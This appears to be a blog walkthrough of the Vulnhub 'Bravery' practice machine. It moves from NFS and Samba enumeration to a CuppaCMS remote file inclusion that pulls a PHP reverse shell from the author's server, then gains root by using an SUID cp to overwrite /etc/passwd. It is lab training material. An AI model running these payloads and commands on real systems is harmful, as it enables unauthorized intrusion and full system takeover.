---
title: "Bravery"
date: 2022-03-30T17:46:31+08:00
draft: false
tags: ["Vulnhub"]
---

This machine hopes to inspire BRAVERY in you; this machine may surprise you from the outside. This is designed for OSCP practise, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original. BRAVERY is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click [here](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/).

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.

> The machine IP address is `192.168.50.109` for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.

## Scanning 

Let us start by scanning using Nmap to find any opened ports in the machine.

```
sudo nmap -sS -sV -oN initial.scan 192.168.50.109
# Nmap 7.92 scan initiated Sat Apr  9 01:40:06 2022 as: nmap -sS -sV -oN initial.scan 192.168.50.109
Nmap scan report for 192.168.50.109
Host is up (0.0033s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain      dnsmasq 2.76
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp  open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     3 (RPC #100227)
3306/tcp open  mysql       MariaDB (unauthorized)
8080/tcp open  http        nginx 1.12.2

```

From the scan, it tells us that several ports is open: 

- SSH = Port 22
- DNS = Port 53 
- HTTP/HTTPS = Port 80 and 443, Port 8080
- MySQL = Port 3306 
- NFS = Port 111 and 2049
- Samba = Port 139 and 445

## Enumeration

#### Port 111 and 2049 (RPC and NFS)

Looking at Port 2049 using the command `showmount`, i found that the shared folder is `/var/nfsshare`. 

```
showmount -e 192.168.50.109
/var/nfsshare
```

To mount this, i simply create a folder for it to mount in my `/tmp` folder. 

```
mkdir /tmp/mount
sudo mount -t nfs 192.168.50.109:/var/nfsshare /tmp/mnt
cd /tmp/mount
ls -l 
total 24
-rw-r--r-- 1 root root  29 Dec 26  2018 discovery
-rw-r--r-- 1 root root  51 Dec 26  2018 enumeration
-rw-r--r-- 1 root root  20 Dec 26  2018 explore
drwxr-xr-x 2 root root  19 Dec 26  2018 itinerary
-rw-r--r-- 1 root root 104 Dec 26  2018 password.txt
-rw-r--r-- 1 root root  67 Dec 26  2018 qwertyuioplkjhgfdsazxcvbnm
-rw-r--r-- 1 root root  15 Dec 26  2018 README.txt
```

Viewing the folder that i've mount, I found a few files inside the shared folder. Every file of this is a clue of where the password is.

```
┌──(kali㉿kali)-[/tmp/mount]
└─$ cat password.txt 
Passwords should not be stored in clear-text, written in post-its or written on files on the hard disk!
                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/mount]
└─$ cat qwertyuioplkjhgfdsazxcvbnm 
Sometimes, the answer you seek may be right before your very eyes.
```

The hints was that password should not stored in clear-text and on the hard disk. This tells me that the file name called `qwertyuioplkjhgfdsazxcvbnm` could be the password. Well lets hold on to that for now. 

#### Port 139 and 445 (Samba)

Moving to Samba next, I going to see what folders are there that we can use to log in using `smbclient` command: 

```
smbclient -L \\\\192.168.50.109\\             
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	anonymous       Disk      
	secured         Disk      
	IPC$            IPC       IPC Service (Samba Server 4.7.1)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BRAVERY
```

I see 2 share folder called `anonymous` and `secured`. We can login `anonymously` to access the `anonymous` folder. 

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.50.109\\anonymous       
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 28 09:01:35 2018
  ..                                  D        0  Thu Jun 14 12:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 08:38:27 2018
  qiu's folder                        D        0  Fri Sep 28 09:27:20 2018
  genevieve's folder                  D        0  Fri Sep 28 09:08:31 2018
  david's folder                      D        0  Tue Dec 25 21:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 08:52:49 2018
  qinyi's folder                      D        0  Fri Sep 28 08:45:22 2018
  sara's folder                       D        0  Fri Sep 28 09:34:23 2018
  readme.txt                          N      489  Fri Sep 28 09:54:03 2018                N      489  Fri Sep 28 09:54:03 2018
```

I see 7 potential usernames here. With the password we found in the nfs share, username `david` can view the `secured` file. Upon logging in, we can see 3 files in the folder. Download `genevieve.txt` and view it.

```
┌──(kali㉿kali)-[~/Vulnhub/Bravery]
└─$ smbclient -U david \\\\192.168.50.109\\secured
Enter WORKGROUP\david's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 28 09:52:14 2018
  ..                                  D        0  Thu Jun 14 12:30:39 2018
  david.txt                           N      376  Sat Jun 16 04:36:07 2018
  genevieve.txt                       N      398  Mon Jul 23 12:51:27 2018
  README.txt                          N      323  Mon Jul 23 21:58:53 2018

		17811456 blocks of size 1024. 13021812 blocks available
smb: \> get genevieve.txt 
getting file \genevieve.txt of size 398 as genevieve.txt (25.9 KiloBytes/sec) (average 25.9 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Vulnhub/Bravery]
└─$ cat genevieve.txt 
Hi! This is Genevieve!

We are still trying to construct our department's IT infrastructure; it's been proving painful so far.

If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:

a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
```

Reading `genevieve.txt`, it point us to a website: `http://ipaddress/genevieve`. 


#### Port 80 (HTTP)

Navigating to `http://ipaddress/genevieve` will bring us to a website page, which template are from OS Templates. 

{{<image src="/Bravery/1.png" position="center" style="border-radius: 8px;">}}

The only accessible page from that website is under `Internal Use Only > Knowledge Management`, which will bring us to CuppaCMS. 

{{<image src="/Bravery/2.png" position="center" style="border-radius: 8px;">}}

## Initial Foothold via LFI/RCE 

Searching about CuppaCMS vulnerability in searchsploit, i realise that this CMS is vulnerable to PHP Code Injection. Can read more about it [here.](https://www.exploit-db.com/exploits/25971) in the exploit-db website.

Reading more on the vulnerability of this also shows us how to exploit it:

```
RCE -> http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
LFI -> http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

I can do an LFI or RFI on the system thru this vulnerability. To test it out, i will do the LFI first and  Do take note to only that i only copy starting from `alerts`. 

Proof of LFI Works: 

{{<image src="/Bravery/3.png" position="center" style="border-radius: 8px;">}}

For the RCE, i will run a simple server where i can retrieve my php-reverse-shell script and run `nc` to catch the shell. 

> Change the IP and the Port in the script to catch the shell 

Run `Python simpleHTTPServer` where the php-reverse-shell is:

```
python3 -m http.server 9001
```

Run `nc`:

```
nc -lvnp 1234
listening on [any] 1234 ...
```

Lastly, run the payload on the site: 

```
http://192.168.50.109/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.10.10.2:9001/php-reverse-shell.php
```

Check our `nc`, we should recieve a shell from running the payload: 

```
┌──(kali㉿kali)-[~/Vulnhub/Bravery]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.2] from (UNKNOWN) [192.168.50.109] 48362
Linux bravery 3.10.0-862.3.2.el7.x86_64 #1 SMP Mon May 21 23:36:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 13:43:31 up 1 day, 23:14,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh-4.2$
```

Lets stable the shell before we move forward: 

```
sh-4.2$ export TERM=xterm
export TERM=xterm
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Vulnhub/Bravery]
└─$ stty raw -echo; fg                                                                                                                                                                                                            148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 1234

bash-4.2$
```

## Privileged Escalation

#### Finding SUID Binaries 

Start off by finding binaries that has SUID permission:

```
bash-4.2$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/cp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/Xorg
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/ksu
/usr/bin/at
/usr/bin/staprun

...
bash-4.2$
```

I see that the command `cp` has SUID permission. Reading GTFObin [here](https://gtfobins.github.io/gtfobins/cp/#suid) on option b, it can be used to copy,read or write files from a restricted file system. With this, I can duplicate the `/etc/passwd` file, inject my own username and password with root privileged and copy it back to the system. This works because the commmand `cp` will always run as root due to the SUID permission. 

#### Creating password with OpenSSL

If you read my post [DC-9](https://fspxnky.github.io/dc-9/), its the same way. So im just gonna skim it through:

```
openssl passwd -1 -salt salt password 
$1$salt$qJH7.N4xYta3aEG/dfqo/0
```

Copy the contents of `/etc/passwd` in the victim machine to our local machine and add our user and password at the last line of the file. It will look something like this: 

```
...
ossecm:x:1002:1002::/var/ossec:/sbin/nologin
ossecr:x:1003:1002::/var/ossec:/sbin/nologin
rick:x:1004:1004::/home/rick:/bin/bash
fspxnky:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root/bin/bash
```

Now copy this content back to our victim machine. Lets do it on the `/tmp` folder. Simply create a text file call `passwd` and paste the content inside. Last step is just to copy this file to the `/etc/passwd`, to overwrite the existing file with our newly modified `passwd` file. We should be able to log in with our account now. 

```
bash-4.2$ cp passwd /etc/passwd
bash-4.2$ su fspxnky
Password: 
sh-4.2# id 
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
sh-4.2# cd /root
sh-4.2# ls
Desktop    Downloads  Pictures	Templates  anaconda-ks.cfg    ossec-hids-2.8
Documents  Music      Public	Videos	   author-secret.txt  proof.txt
sh-4.2# cat proof.txt 
Congratulations on rooting BRAVERY. :) 
```

## Summary

This is my 2nd vuln machine from vulnhub. I have to say that i have fun doing this machine because i bang a lot of walls/rabbit hole while doing it. Such as spending too much time on the Port 80 and 8080. After i got my first shell, i was amazed at how easy to find the other user password in MySQL just to find out later that i cant do anything with it after cracking the hash. I can safely say this is one of the friendly beginner machine for those who want to get their feet with it. 